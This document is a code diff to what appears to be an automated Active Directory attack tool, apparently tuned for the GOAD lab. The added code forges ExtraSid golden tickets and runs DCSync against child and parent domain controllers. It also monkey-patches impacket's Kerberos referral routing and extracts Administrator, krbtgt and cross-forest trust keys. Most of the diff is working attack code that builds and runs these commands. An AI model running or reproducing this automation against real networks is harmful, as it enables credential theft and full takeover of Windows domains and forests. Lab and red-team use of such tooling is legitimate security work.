@@ -251,8 +251,12 @@ def _build_host_from_nmap(current: dict) -> Host | None:
     if not current["ip"]:
         return None
     hostname = current["hostname"]
-    if hostname and current["domain"] and "." not in hostname:
-        hostname = f"{hostname.lower()}.{current['domain'].lower()}"
+    # NOTE: Do NOT join short hostname with nmap's (Domain:...) to build FQDN.
+    # nmap's LDAP probe reports the forest root domain (e.g., "sevenkingdoms.local")
+    # even for child domain DCs (e.g., winterfell belongs to "north.sevenkingdoms.local").
+    # Joining produces wrong FQDNs like "winterfell.sevenkingdoms.local".
+    # The correct FQDN will be discovered by netexec SMB which reports the actual domain,
+    # and merged via add_host()'s hostname upgrade logic.
     services_lower = [s.lower() for s in current["services"]]
     is_dc = any("ldap" in s for s in services_lower) and any(
         "kerberos" in s for s in services_lower
@@ -3296,8 +3300,12 @@ async def _auto_golden_ticket(
                     logger.debug(f"🎫 Auto-golden-ticket: Redis sync error (non-fatal): {sync_err}")
 
             # Get domains that already have golden tickets (from persisted state)
+            # Exclude failed attempts so they can be retried
             processed_domains = {
-                t.get("domain", "").lower() for t in state.golden_tickets if t.get("domain")
+                t.get("domain", "").lower()
+                for t in state.golden_tickets
+                if t.get("domain")
+                and t.get("status") not in ("failed_ticketer", "failed_exception")
             }
 
             # Check for unprocessed krbtgt hashes BEFORE checking completed flag.
@@ -3712,11 +3720,20 @@ async def _auto_golden_ticket(
                                     f"🎫 Auto-golden-ticket: DNS resolution failed for parent: {dns_err}"
                                 )
 
-                        if parent_dc_ip:
-                            # Run lookupsid on parent DC to get parent SID
+                        # Check domain_sids cache first (populated by inject-domain-sid CLI
+                        # or secretsdump extraction) — avoids lookupsid which often fails in GOAD
+                        cached_parent_sid = state.domain_sids.get(parent_domain.lower())
+                        if cached_parent_sid:
+                            parent_sid = cached_parent_sid
                             logger.info(
-                                f"🎫 Auto-golden-ticket: Child domain detected! "
-                                f"Getting parent SID from {parent_domain} ({parent_dc_ip})"
+                                f"🎫 Auto-golden-ticket: Using cached parent SID {parent_sid} "
+                                f"for {parent_domain} (from domain_sids cache)"
+                            )
+                        elif parent_dc_ip:
+                            # Fall back to lookupsid on parent DC
+                            logger.info(
+                                f"🎫 Auto-golden-ticket: No cached SID for {parent_domain}, "
+                                f"running lookupsid on {parent_dc_ip}"
                             )
                             if cred:
                                 parent_cmd = [
@@ -3744,10 +3761,39 @@ async def _auto_golden_ticket(
                                 )
                                 if parent_sid_match:
                                     parent_sid = parent_sid_match.group(1)
+                                    state.domain_sids[parent_domain.lower()] = parent_sid
                                     logger.info(
                                         f"🎫 Auto-golden-ticket: Got parent SID {parent_sid} "
                                         f"for {parent_domain}"
                                     )
+                                else:
+                                    parent_preview = parent_output[:300].replace("\n", "\\n")
+                                    logger.warning(
+                                        f"🎫 Auto-golden-ticket: lookupsid returned no SID for "
+                                        f"{parent_domain}, trying LDAP fallback. "
+                                        f"Output: {parent_preview}"
+                                    )
+                                    # LDAP fallback for parent SID
+                                    try:
+                                        parent_sid = await _get_domain_sid_via_ldap(
+                                            parent_dc_ip, parent_domain, cred, auth_hash
+                                        )
+                                        if parent_sid:
+                                            state.domain_sids[parent_domain.lower()] = parent_sid
+                                            logger.info(
+                                                f"🎫 Auto-golden-ticket: Got parent SID via LDAP: "
+                                                f"{parent_sid}"
+                                            )
+                                        else:
+                                            logger.warning(
+                                                f"🎫 Auto-golden-ticket: LDAP also returned no "
+                                                f"SID for {parent_domain}"
+                                            )
+                                    except Exception as ldap_err:
+                                        logger.warning(
+                                            f"🎫 Auto-golden-ticket: Parent LDAP fallback "
+                                            f"failed: {ldap_err}"
+                                        )
                             except Exception as e:
                                 logger.warning(
                                     f"🎫 Auto-golden-ticket: Failed to get parent SID: {e}"
@@ -3756,7 +3802,9 @@ async def _auto_golden_ticket(
                     # Generate golden ticket
                     # Prefer AES256 key over NTLM hash for modern Windows (2016+)
                     # RC4 golden tickets fail with KDC_ERR_TGT_REVOKED on newer DCs
-                    ticket_path = "/tmp/Administrator.ccache"  # nosec B108 # noqa: S108
+                    # Use domain-specific path to avoid overwriting tickets from other domains
+                    domain_label = domain.replace(".", "_")
+                    ticket_path = f"/tmp/Administrator_{domain_label}.ccache"  # nosec B108 # noqa: S108
 
                     if hash_obj.aes_key:
                         # Use AES256 key (required for Windows 2016+)
@@ -3810,49 +3858,137 @@ async def _auto_golden_ticket(
                             f"   Parent: {parent_domain} (SID: {parent_sid})\n"
                             f"   ExtraSid: {enterprise_admin_sid}"
                         )
-                    stdout, stderr, returncode = run_tool(cmd, timeout_seconds=120)
-                    output = stdout + "\n" + (stderr or "")
+                    # Impacket cross-realm referral is broken (fortra/impacket#315)
+                    # so ExtraSid golden ticket can't DCSync parent directly.
+                    # Two-step workaround:
+                    #   Step 1: ticketer + DCSync CHILD for parent trust key
+                    #           (same realm → no referral → works)
+                    #   Step 2: forge inter-realm TGT with trust key → DCSync
+                    #           PARENT for {Admin, krbtgt, foreign trust keys}
+                    #           (direct presentation → no referral → works)
+                    #
+                    # Each step combines ticketer + secretsdump in one run_tool
+                    # call for ccache worker pod affinity.
+                    if parent_sid and parent_dc_ip:
+                        # In child domains, dc_ip and parent_dc_ip are
+                        # often SWAPPED because the child DC's hostname
+                        # is in the parent DNS zone (e.g., winterfell
+                        # registered as winterfell.sevenkingdoms.local
+                        # but is actually the DC for north.sk.local).
+                        # DNS SRV won't help (no dig on orchestrator).
+                        #
+                        # Robust approach: collect all candidate DC IPs
+                        # and try each one. Wrong DC fails fast (realm
+                        # mismatch), correct one succeeds. The || in
+                        # bash chains the attempts.
+
+                        # Collect unique DC candidate IPs with hostnames
+                        dc_candidates = []
+                        seen_ips = set()
+                        for cand_ip in [dc_ip, parent_dc_ip]:
+                            if cand_ip and cand_ip not in seen_ips:
+                                seen_ips.add(cand_ip)
+                                short = None
+                                for h in state.all_hosts:
+                                    if h.ip == cand_ip and h.hostname:
+                                        short = h.hostname.split(".")[0]
+                                        break
+                                dc_candidates.append((cand_ip, short))
+
+                        # Parent trust account in child domain
+                        # parent_domain is guaranteed non-None here (guarded by if parent_domain)
+                        parent_netbios = parent_domain.split(".")[0].upper()  # type: ignore[union-attr]
+                        trust_account = f"{parent_netbios}$"
+
+                        # Foreign forests to extract from parent later
+                        undominated = state.get_undominated_forests()
+
+                        # Build ticketer command string
+                        ticketer_str = " ".join(cmd)
+
+                        # Step 1: golden ticket + child DCSync for trust
+                        # key. Try each candidate DC — the one serving
+                        # the child domain will succeed, others fail
+                        # with KDC_ERR_WRONG_REALM.
+                        # NOTE: impacket returns exit code 0 even on
+                        # Kerberos errors, so || won't work. Run ALL
+                        # candidates with ; (all run regardless). The
+                        # trust hash regex matches the successful one.
+                        attempts = []
+                        for cand_ip, cand_short in dc_candidates:
+                            fqdn = f"{cand_short}.{domain}" if cand_short else domain
+                            attempts.append(
+                                f"echo 'CANDIDATE_DC={cand_ip}' && "
+                                f"KRB5CCNAME=Administrator.ccache "
+                                f"impacket-secretsdump -k -no-pass "
+                                f"-just-dc-user '{trust_account}' "
+                                f"-target-ip {cand_ip} "
+                                f"-dc-ip {cand_ip} "
+                                f"'{domain}/Administrator@{fqdn}'"
+                                f" 2>&1"
+                            )
+                        secretsdump_chain = "; ".join(attempts)
+                        step1_bash = f"{ticketer_str} && {{ {secretsdump_chain}; }}"
+
+                        logger.debug(f"🎫 Step 1 bash: {step1_bash}")
+
+                        cand_desc = ", ".join(f"{s or '?'}/{ip}" for ip, s in dc_candidates)
+                        logger.info(
+                            f"🎫 Step 1/2: ExtraSid golden ticket + "
+                            f"extract {trust_account} from {domain}\n"
+                            f"   DC candidates: {cand_desc}"
+                        )
+
+                        step1_cmd = ["bash", "-c", step1_bash]
+                        stdout, stderr, returncode = run_tool(step1_cmd, timeout_seconds=600)
+                        output = stdout + "\n" + (stderr or "")
+
+                        # Also resolve parent DC target for Step 2
+                        # (use first candidate that ISN'T the child DC)
+                        parent_dc_target = parent_dc_ip
+                        for h in state.all_hosts:
+                            if h.ip == parent_dc_ip and h.hostname:
+                                parent_dc_target = h.hostname
+                                break
+                    else:
+                        # No parent DC or no parent SID — just run ticketer.
+                        # cmd already includes ExtraSid if parent_sid was set.
+                        stdout, stderr, returncode = run_tool(cmd, timeout_seconds=300)
+                        output = stdout + "\n" + (stderr or "")
 
                     if returncode == 0 or "Saving ticket" in output:
-                        # Look up actual DC FQDN from discovered hosts (not hardcoded dc.{domain})
+                        # Look up actual DC FQDN from discovered hosts
                         dc_fqdn = None
                         for host in state.all_hosts:
                             if host.ip == dc_ip and host.hostname and "." in host.hostname:
                                 dc_fqdn = host.hostname
                                 break
-                        # Fallback to IP if no FQDN found
                         dc_target = dc_fqdn or dc_ip
 
-                        # Build success message based on whether we have ExtraSid
                         if parent_sid:
-                            # Get parent DC for the "next steps" message
-                            parent_dc_fqdn = None
-                            for host in state.all_hosts:
-                                if host.is_dc and host.hostname:
-                                    h_domain = ".".join(host.hostname.lower().split(".")[1:])
-                                    if h_domain == parent_domain:
-                                        parent_dc_fqdn = host.hostname
-                                        break
-                            parent_dc_target = parent_dc_fqdn or parent_dc_ip or "parent-dc"
-
+                            _pdc_log = (
+                                parent_dc_target if parent_dc_ip else parent_dc_ip or "parent-dc"
+                            )
                             logger.success(
                                 f"🎫 GOLDEN TICKET WITH EXTRASID GENERATED!\n"
                                 f"→ Child domain: {domain}\n"
-                                f"→ Parent domain: {parent_domain} (ENTERPRISE ADMIN ACCESS)\n"
+                                f"→ Parent domain: {parent_domain} "
+                                f"(ENTERPRISE ADMIN ACCESS)\n"
                                 f"→ Ticket saved as {ticket_path}\n"
                                 f"→ Use: export KRB5CCNAME={ticket_path}\n"
-                                f"→ DCSync parent: secretsdump.py -k -no-pass {parent_dc_target}"
+                                f"→ DCSync parent: secretsdump.py -k "
+                                f"-no-pass {_pdc_log}"
                             )
                         else:
                             logger.success(
                                 f"🎫 GOLDEN TICKET GENERATED for {domain}!\n"
                                 f"→ Ticket saved as {ticket_path}\n"
                                 f"→ Use: export KRB5CCNAME={ticket_path}\n"
-                                f"→ Then: psexec.py -k -no-pass -target-ip {dc_ip} {dc_target}"
+                                f"→ Then: psexec.py -k -no-pass "
+                                f"-target-ip {dc_ip} {dc_target}"
                             )
 
-                        # Announce golden ticket - this sets has_golden_ticket, checkpoints,
-                        # and marks operation complete if stop_on_golden_ticket is enabled
+                        # Announce golden ticket
                         await dispatcher.announce_golden_ticket(
                             domain=domain,
                             krbtgt_hash=hash_obj.hash_value,
@@ -3861,151 +3997,499 @@ async def _auto_golden_ticket(
                             target_domain=parent_domain if parent_sid else None,
                         )
 
-                        # If we have Enterprise Admin via ExtraSid, also mark parent domain as dominated
+                        # If ExtraSid, mark parent as dominated and
+                        # extract trust keys via 2-step approach.
                         if parent_sid and parent_domain:
                             if parent_domain.lower() not in [
                                 d.lower() for d in state.domain_admin_domains
                             ]:
                                 state.domain_admin_domains.append(parent_domain)
                                 logger.info(
-                                    f"🎫 Enterprise Admin achieved on parent domain: {parent_domain}"
+                                    f"🎫 Enterprise Admin achieved on "
+                                    f"parent domain: {parent_domain}"
                                 )
 
-                            # DCSync parent domain to get Administrator hash for trust extraction
-                            # This is needed because child domain hash doesn't work on parent DC
+                            # Parse child→parent trust key from step 1
                             if parent_dc_ip:
-                                logger.info(
-                                    f"🎫 Auto-golden-ticket: DCSync parent domain {parent_domain} "
-                                    f"using golden ticket with ExtraSid"
-                                )
                                 try:
-                                    # DCSync parent domain - just get Administrator
-                                    parent_dc_fqdn = None
-                                    for h in state.all_hosts:
-                                        if h.ip == parent_dc_ip and h.hostname:
-                                            parent_dc_fqdn = h.hostname
-                                            break
-                                    parent_target = parent_dc_fqdn or parent_dc_ip
+                                    from ares.core.models import Hash
 
-                                    # Update /etc/hosts for Kerberos to resolve domain KDCs
-                                    # The golden ticket realm is the CHILD domain, so Kerberos
-                                    # needs to contact child domain KDC for authentication
-                                    try:
-                                        hosts_entries = []
-                                        # Add child domain DC (ticket realm KDC)
-                                        child_dc_ip = state.domain_controllers.get(domain.lower())
-                                        if child_dc_ip:
-                                            hosts_entries.append(
-                                                f"{child_dc_ip}  {domain} {domain.upper()}"
-                                            )
-                                        # Add parent domain DC
-                                        hosts_entries.append(
-                                            f"{parent_dc_ip}  {parent_domain} {parent_domain.upper()}"
+                                    trust_hash_match = re.search(
+                                        rf"{re.escape(trust_account)}"
+                                        rf":\d+:"
+                                        rf"[a-fA-F0-9]{{32}}:"
+                                        rf"([a-fA-F0-9]{{32}})",
+                                        output,
+                                    )
+                                    trust_aes_match = re.search(
+                                        rf"{re.escape(trust_account)}:"
+                                        rf"aes256-cts-hmac-sha1-96:"
+                                        rf"([a-fA-F0-9]+)",
+                                        output,
+                                    )
+
+                                    if not trust_hash_match:
+                                        # Show which candidates
+                                        # appeared and last 500 chars
+                                        found_markers = re.findall(
+                                            r"CANDIDATE_DC=(\S+)",
+                                            output,
                                         )
-                                        if hosts_entries:
-                                            with open("/etc/hosts", "a") as f:  # noqa: ASYNC230
-                                                f.write("\n# Ares golden ticket domains\n")
-                                                f.writelines(
-                                                    f"{entry}\n" for entry in hosts_entries
-                                                )
-                                            logger.debug(
-                                                f"🎫 Added /etc/hosts entries for Kerberos: "
-                                                f"{hosts_entries}"
-                                            )
-                                    except Exception as hosts_err:
                                         logger.warning(
-                                            f"🎫 Failed to update /etc/hosts: {hosts_err}"
+                                            f"🎫 Step 1 failed: "
+                                            f"{trust_account} not found "
+                                            f"in child DCSync output "
+                                            f"({len(output)} chars, "
+                                            f"markers={found_markers}). "
+                                            f"Last 800: "
+                                            f"{output[-800:]}"
                                         )
-
-                                    # Run secretsdump with KRB5CCNAME set in the remote shell
-                                    # (os.environ only affects local process, not remote execution)
-                                    dcsync_cmd = [
-                                        "bash",
-                                        "-c",
-                                        f"KRB5CCNAME={ticket_path} impacket-secretsdump -k -no-pass "
-                                        f"-just-dc-user Administrator -target-ip {parent_dc_ip} {parent_target}",
-                                    ]
-                                    logger.info(
-                                        f"🎫 Running DCSync on parent: KRB5CCNAME={ticket_path} "
-                                        f"impacket-secretsdump -k -no-pass -just-dc-user Administrator "
-                                        f"-target-ip {parent_dc_ip} {parent_target}"
-                                    )
-                                    dcsync_stdout, dcsync_stderr, _dcsync_rc = run_tool(
-                                        dcsync_cmd, timeout_seconds=120
-                                    )
-                                    dcsync_output = dcsync_stdout + "\n" + (dcsync_stderr or "")
-
-                                    # Parse Administrator hash from output
-                                    # Format: domain\Administrator:RID:LM:NT:::
-                                    admin_hash_match = re.search(
-                                        r"Administrator:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
-                                        dcsync_output,
-                                    )
-                                    if admin_hash_match:
-                                        parent_admin_hash = admin_hash_match.group(1)
-                                        logger.success(
-                                            f"🎫 Got parent Administrator hash via DCSync: "
-                                            f"{parent_domain}\\Administrator"
-                                        )
-                                        # Add parent Administrator hash to state
-                                        from ares.core.models import Hash
-
-                                        parent_hash_obj = Hash(
-                                            username="Administrator",
-                                            domain=parent_domain,
-                                            hash_type="NTLM",
-                                            hash_value=parent_admin_hash,
-                                            source="auto_golden_ticket:dcsync_parent",
-                                        )
-                                        state.add_hash(parent_hash_obj)
-
-                                        # Mark parent domain as DA (we have Administrator hash)
-                                        state.has_domain_admin = True
-                                        if parent_domain.lower() not in [
-                                            d.lower() for d in state.domain_admin_domains
-                                        ]:
-                                            state.domain_admin_domains.append(parent_domain.lower())
-
-                                        # Trigger trust key extraction now that we have parent DA
-                                        # This extracts ESSOS$ and other trust account hashes
-                                        try:
-                                            await dispatcher._auto_dispatch_trust_key_extraction(
-                                                da_domain=parent_domain,
-                                                da_username="Administrator",
-                                                undominated_forests=state.get_undominated_forests(),
-                                                source_agent="auto_golden_ticket",
-                                            )
-                                        except Exception as trust_err:
-                                            logger.warning(
-                                                f"🎫 Trust extraction dispatch failed: {trust_err}"
-                                            )
-
-                                        # Also get parent krbtgt if present
-                                        krbtgt_match = re.search(
-                                            r"krbtgt:\d+:[a-fA-F0-9]{32}:([a-fA-F0-9]{32})",
-                                            dcsync_output,
-                                        )
-                                        if krbtgt_match:
-                                            parent_krbtgt_hash = krbtgt_match.group(1)
-                                            parent_krbtgt_obj = Hash(
-                                                username="krbtgt",
-                                                domain=parent_domain,
-                                                hash_type="NTLM",
-                                                hash_value=parent_krbtgt_hash,
-                                                source="auto_golden_ticket:dcsync_parent",
-                                            )
-                                            state.add_hash(parent_krbtgt_obj)
-                                            logger.success(
-                                                f"🎫 Got parent krbtgt hash via DCSync: "
-                                                f"{parent_domain}\\krbtgt"
-                                            )
                                     else:
-                                        logger.warning(
-                                            f"🎫 DCSync parent failed to extract Administrator hash: "
-                                            f"{dcsync_output[:300]}"
+                                        trust_nt_hash = trust_hash_match.group(1)
+                                        trust_aes_key = (
+                                            trust_aes_match.group(1) if trust_aes_match else ""
                                         )
-                                except Exception as dcsync_err:
-                                    logger.warning(f"🎫 DCSync parent domain failed: {dcsync_err}")
+                                        logger.success(
+                                            f"🎫 Got child→parent trust "
+                                            f"key: {trust_account} "
+                                            f"(NTLM: "
+                                            f"{trust_nt_hash[:8]}..., "
+                                            f"AES: "
+                                            f"{'yes' if trust_aes_key else 'no'})"
+                                        )
+
+                                        # Store trust key
+                                        state.add_hash(
+                                            Hash(
+                                                username=trust_account,
+                                                domain=domain,
+                                                hash_type="NTLM",
+                                                hash_value=trust_nt_hash,
+                                                aes_key=trust_aes_key,
+                                                source="auto_golden_ticket:child_dcsync",
+                                            ),
+                                            "auto_golden_ticket",
+                                        )
+
+                                        # === Step 2: DCSync parent via
+                                        # referral routing ===
+                                        # Reuse the SAME ExtraSid golden
+                                        # ticket and monkey-patch impacket's
+                                        # sendReceive() to fix cross-realm
+                                        # referral routing (#315).
+                                        #
+                                        # Flow:
+                                        # 1. Re-forge ExtraSid golden ticket
+                                        # 2. secretsdump targets parent DC
+                                        # 3. Kerberos TGS-REQ → child DC
+                                        # 4. Child DC issues referral TGT
+                                        # 5. Patched sendReceive routes
+                                        #    referral to parent DC
+                                        # 6. Parent issues service ticket
+                                        # 7. DCSync succeeds
+
+                                        # Build parent DCSync targets
+                                        # Prefix with parent NetBIOS
+                                        # domain to avoid
+                                        # ERROR_DS_NAME_ERROR_NOT_UNIQUE
+                                        # (Administrator/krbtgt exist in
+                                        # both child and parent domains)
+                                        parent_nb = parent_domain.split(".")[0].upper()
+                                        parent_targets = [
+                                            f"{parent_nb}\\Administrator",
+                                            f"{parent_nb}\\krbtgt",
+                                        ]
+                                        for fd in undominated:
+                                            fn = fd.split(".")[0].upper()
+                                            parent_targets.append(f"{fn}$")
+
+                                        import shlex
+
+                                        # Sync hosts from Redis before
+                                        # DC resolution — injected hosts
+                                        # may have updated FQDNs
+                                        try:
+                                            redis_hosts = await backend.get_hosts()
+                                            for rh in redis_hosts:
+                                                state.add_host(rh)
+                                            logger.info(
+                                                f"🎫 Step 2: synced "
+                                                f"{len(redis_hosts)} "
+                                                f"hosts from Redis"
+                                            )
+                                        except Exception as _hsync:
+                                            logger.warning(f"🎫 Step 2: host sync failed: {_hsync}")
+
+                                        # Resolve which candidate DC serves
+                                        # which domain using CANDIDATE_DC
+                                        # markers from Step 1 output.
+                                        # The candidate whose output
+                                        # contains the trust hash is the
+                                        # child DC; the other is parent.
+                                        child_dc_step2 = None
+                                        parent_dc_step2 = None
+                                        parent_fqdn_step2 = None
+
+                                        # Parse CANDIDATE_DC markers:
+                                        # split output by marker to find
+                                        # which candidate produced the
+                                        # trust hash
+                                        cand_ips = [ip for ip, _ in dc_candidates]
+                                        marker_sections = re.split(
+                                            r"CANDIDATE_DC=(\S+)",
+                                            output,
+                                        )
+                                        # marker_sections is:
+                                        # [pre, ip1, text1, ip2, text2, ...]
+                                        for idx in range(1, len(marker_sections), 2):
+                                            m_ip = marker_sections[idx]
+                                            m_text = (
+                                                marker_sections[idx + 1]
+                                                if idx + 1 < len(marker_sections)
+                                                else ""
+                                            )
+                                            if trust_nt_hash in m_text:
+                                                child_dc_step2 = m_ip
+                                                break
+
+                                        if child_dc_step2:
+                                            # Parent is the OTHER candidate
+                                            for cip in cand_ips:
+                                                if cip != child_dc_step2:
+                                                    parent_dc_step2 = cip
+                                                    break
+                                            if not parent_dc_step2:
+                                                # Only one candidate — use
+                                                # parent_dc_ip as fallback
+                                                parent_dc_step2 = parent_dc_ip
+                                            logger.info(
+                                                f"🎫 Step 2 DC resolution "
+                                                f"(from markers): child="
+                                                f"{child_dc_step2}, "
+                                                f"parent="
+                                                f"{parent_dc_step2}"
+                                            )
+                                        else:
+                                            # Marker approach failed —
+                                            # fall back to hostname-based
+                                            logger.warning(
+                                                "🎫 Step 2: CANDIDATE_DC "
+                                                "markers didn't resolve, "
+                                                "trying hostnames"
+                                            )
+                                            dc_host_map = {
+                                                h.ip: h.hostname
+                                                for h in state.all_hosts
+                                                if h.hostname
+                                            }
+                                            logger.info(
+                                                f"🎫 Step 2 DC fallback: "
+                                                f"candidates="
+                                                f"{dc_candidates}, "
+                                                f"host_map="
+                                                f"{dc_host_map}"
+                                            )
+                                            for (
+                                                cand_ip,
+                                                _cs,
+                                            ) in dc_candidates:
+                                                for h in state.all_hosts:
+                                                    if (
+                                                        h.ip == cand_ip
+                                                        and h.hostname
+                                                        and "." in h.hostname
+                                                    ):
+                                                        hd = h.hostname.split(".", 1)[1].lower()
+                                                        if hd == domain.lower():
+                                                            child_dc_step2 = cand_ip
+                                                        elif hd == parent_domain.lower():
+                                                            parent_dc_step2 = cand_ip
+                                                            parent_fqdn_step2 = h.hostname
+                                                        break
+
+                                        if not child_dc_step2 or not parent_dc_step2:
+                                            logger.warning(
+                                                "🎫 Step 2: Could not "
+                                                "resolve child/parent DC, "
+                                                "using dc_ip/parent_dc_ip"
+                                            )
+                                            child_dc_step2 = child_dc_step2 or dc_ip
+                                            parent_dc_step2 = parent_dc_step2 or parent_dc_ip
+
+                                        # Resolve parent FQDN for
+                                        # secretsdump target
+                                        if not parent_fqdn_step2:
+                                            for h in state.all_hosts:
+                                                if h.ip == parent_dc_step2 and h.hostname:
+                                                    parent_fqdn_step2 = h.hostname
+                                                    break
+                                        if not parent_fqdn_step2:
+                                            parent_fqdn_step2 = parent_domain
+                                        targets_str = ",".join(parent_targets)
+
+                                        # Python script that:
+                                        # 1. Patches sendReceive to route
+                                        #    referrals to correct parent DC
+                                        #    (fixes fortra/impacket#315)
+                                        # 2. Runs secretsdump in-process
+                                        #    for each target user
+                                        dcsync_py = (
+                                            "import os,sys,re,"
+                                            "runpy,shutil\n"
+                                            "from impacket.krb5"
+                                            " import kerberosv5\n"
+                                            "_oSR=kerberosv5"
+                                            ".sendReceive\n"
+                                            f'CD="{domain.upper()}"\n'
+                                            f"PD="
+                                            f'"{parent_domain.upper()}"\n'
+                                            f"CDC="
+                                            f'"{child_dc_step2}"\n'
+                                            f"PDC="
+                                            f'"{parent_dc_step2}"\n'
+                                            f"PF="
+                                            f'"{parent_fqdn_step2}"\n'
+                                            "DKM={CD:CDC,PD:PDC}\n"
+                                            "def _pSR(d,dom,kdc=None):\n"
+                                            "  m=DKM.get(dom.upper())\n"
+                                            "  if m:\n"
+                                            "    try:\n"
+                                            "      return _oSR(d,dom,m)\n"
+                                            "    except Exception as e1:\n"
+                                            "      print(f'KDC {m} failed"
+                                            " for {dom}: {e1}')\n"
+                                            "      for a in"
+                                            " set(DKM.values()):\n"
+                                            "        if a!=m:\n"
+                                            "          try:"
+                                            "return _oSR(d,dom,a)\n"
+                                            "          except:pass\n"
+                                            "      raise\n"
+                                            "  return _oSR(d,dom,kdc)\n"
+                                            "kerberosv5.sendReceive"
+                                            "=_pSR\n"
+                                            "os.environ['KRB5CCNAME']="
+                                            "'Administrator.ccache'\n"
+                                            "w=shutil.which("
+                                            "'impacket-secretsdump')\n"
+                                            "sd=None\n"
+                                            "if w:\n"
+                                            "  with open(w) as f:\n"
+                                            "    c=f.read()\n"
+                                            '  m=re.search(r\'"([^"]*'
+                                            "secretsdump\\.py)\"',c)\n"
+                                            "  if m:sd=m.group(1)\n"
+                                            "  elif c.startswith("
+                                            "'#!/usr/bin/env python'):\n"
+                                            "    sd=w\n"
+                                            "if not sd:\n"
+                                            "  sd='/opt/impacket/"
+                                            "examples/secretsdump.py'\n"
+                                            "print(f'using {sd}')\n"
+                                            f'TARGETS="{targets_str}"\n'
+                                            "for usr in"
+                                            " TARGETS.split(','):\n"
+                                            "  try:\n"
+                                            "    sys.argv=["
+                                            "'secretsdump','-k',"
+                                            "'-no-pass','-just-dc-user'"
+                                            ",usr,'-just-dc-ntlm',"
+                                            "'-target-ip',PDC,"
+                                            "'-dc-ip',CDC,"
+                                            "CD+'/Administrator@'"
+                                            "+PF]\n"
+                                            "    print("
+                                            "f'DCSync {usr} via {PF}')\n"
+                                            "    runpy.run_path(sd,"
+                                            "run_name='__main__')\n"
+                                            "  except SystemExit:pass\n"
+                                            "  except Exception as e:\n"
+                                            "    print("
+                                            "f'DCSync {usr}: {e}')\n"
+                                        )
+                                        dcsync_cmd = f"python3 -c {shlex.quote(dcsync_py)}"
+
+                                        # Reuse Step 1 golden ticket
+                                        step2_bash = f"{ticketer_str} && {dcsync_cmd}"
+
+                                        logger.info(
+                                            f"🎫 Step 2/2: Parent DCSync "
+                                            f"via referral routing\n"
+                                            f"   Targets: "
+                                            f"{', '.join(parent_targets)}"
+                                            f"\n   Child DC: "
+                                            f"{child_dc_step2}"
+                                            f"\n   Parent DC: "
+                                            f"{parent_fqdn_step2} "
+                                            f"({parent_dc_step2})"
+                                        )
+
+                                        step2_cmd = [
+                                            "bash",
+                                            "-c",
+                                            step2_bash,
+                                        ]
+                                        (
+                                            s2_stdout,
+                                            s2_stderr,
+                                            _s2_rc,
+                                        ) = run_tool(
+                                            step2_cmd,
+                                            timeout_seconds=600,
+                                        )
+                                        parent_output = s2_stdout + "\n" + (s2_stderr or "")
+
+                                        # Parse Administrator
+                                        admin_m = re.search(
+                                            r"Administrator:\d+:"
+                                            r"[a-fA-F0-9]{32}:"
+                                            r"([a-fA-F0-9]{32})",
+                                            parent_output,
+                                        )
+                                        if admin_m:
+                                            logger.success(
+                                                f"🎫 Got parent Admin: "
+                                                f"{parent_domain}"
+                                                f"\\Administrator"
+                                            )
+                                            state.add_hash(
+                                                Hash(
+                                                    username="Administrator",
+                                                    domain=parent_domain,
+                                                    hash_type="NTLM",
+                                                    hash_value=admin_m.group(1),
+                                                    source="auto_golden_ticket:parent_dcsync",
+                                                ),
+                                                "auto_golden_ticket",
+                                            )
+                                            state.has_domain_admin = True
+                                            if parent_domain.lower() not in [
+                                                d.lower() for d in (state.domain_admin_domains)
+                                            ]:
+                                                state.domain_admin_domains.append(
+                                                    parent_domain.lower()
+                                                )
+                                        else:
+                                            logger.warning(
+                                                f"🎫 Step 2: no Admin "
+                                                f"hash from parent "
+                                                f"DCSync "
+                                                f"({len(parent_output)}"
+                                                f" chars). Output: "
+                                                f"{parent_output[:5000]}"
+                                            )
+
+                                        # Parse krbtgt + AES
+                                        krbtgt_m = re.search(
+                                            r"krbtgt:\d+:"
+                                            r"[a-fA-F0-9]{32}:"
+                                            r"([a-fA-F0-9]{32})",
+                                            parent_output,
+                                        )
+                                        krbtgt_aes_m = re.search(
+                                            r"krbtgt:"
+                                            r"aes256-cts-hmac-sha1-96:"
+                                            r"([a-fA-F0-9]+)",
+                                            parent_output,
+                                        )
+                                        if krbtgt_m:
+                                            p_aes = krbtgt_aes_m.group(1) if krbtgt_aes_m else ""
+                                            logger.success(
+                                                f"🎫 Got parent krbtgt "
+                                                f"(AES: "
+                                                f"{'yes' if p_aes else 'no'})"
+                                            )
+                                            state.add_hash(
+                                                Hash(
+                                                    username="krbtgt",
+                                                    domain=parent_domain,
+                                                    hash_type="NTLM",
+                                                    hash_value=krbtgt_m.group(1),
+                                                    aes_key=p_aes,
+                                                    source="auto_golden_ticket:parent_dcsync",
+                                                ),
+                                                "auto_golden_ticket",
+                                            )
+
+                                        # Parse foreign trust keys
+                                        # (e.g., ESSOS$ from parent)
+                                        for fd in undominated:
+                                            fn = fd.split(".")[0].upper()
+                                            ta = f"{fn}$"
+                                            th = re.search(
+                                                rf"{re.escape(ta)}"
+                                                rf":\d+:"
+                                                rf"[a-fA-F0-9]{{32}}:"
+                                                rf"([a-fA-F0-9]{{32}})",
+                                                parent_output,
+                                            )
+                                            ta_aes = re.search(
+                                                rf"{re.escape(ta)}:"
+                                                rf"aes256-cts-hmac-"
+                                                rf"sha1-96:"
+                                                rf"([a-fA-F0-9]+)",
+                                                parent_output,
+                                            )
+                                            if th:
+                                                t_aes_val = ta_aes.group(1) if ta_aes else ""
+                                                logger.success(
+                                                    f"🌲 Cross-forest "
+                                                    f"trust key: {ta} "
+                                                    f"from "
+                                                    f"{parent_domain} "
+                                                    f"(NTLM: "
+                                                    f"{th.group(1)[:8]}"
+                                                    f"..., AES: "
+                                                    f"{'yes' if t_aes_val else 'no'})"
+                                                )
+                                                state.add_hash(
+                                                    Hash(
+                                                        username=ta,
+                                                        domain=parent_domain,
+                                                        hash_type="NTLM",
+                                                        hash_value=th.group(1),
+                                                        aes_key=t_aes_val,
+                                                        source="auto_golden_ticket:parent_dcsync",
+                                                    ),
+                                                    "auto_golden_ticket",
+                                                )
+                                            else:
+                                                logger.warning(
+                                                    f"🌲 {ta} not found in parent DCSync"
+                                                )
+
+                                except Exception as escalation_err:
+                                    logger.warning(
+                                        f"🎫 Parent domain escalation failed: {escalation_err}"
+                                    )
+
+                                # Dispatch trust extraction for
+                                # remaining forests — OUTSIDE the
+                                # Step 1/2 try/except so it always
+                                # runs even if hash parsing failed.
+                                # Fix DC cache so dispatch uses the
+                                # correct parent DC IP (may be
+                                # swapped in GOAD).
+                                try:
